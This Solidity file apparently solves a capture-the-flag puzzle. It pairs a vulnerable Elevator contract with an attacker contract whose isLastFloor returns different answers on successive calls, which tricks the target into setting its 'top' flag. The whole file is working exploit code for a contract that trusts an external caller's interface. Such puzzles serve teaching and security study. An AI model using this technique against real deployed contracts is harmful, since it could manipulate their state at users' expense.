// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract BuildingImpl is Building {
    bool private secondTimeCalling = false;
    Elevator private immutable target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        bool _isLastFloor = secondTimeCalling;
        secondTimeCalling = true;
        _floor;
        return _isLastFloor;
    }

    function goToLastFloor() external {
        target.goTo(10);
    }
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}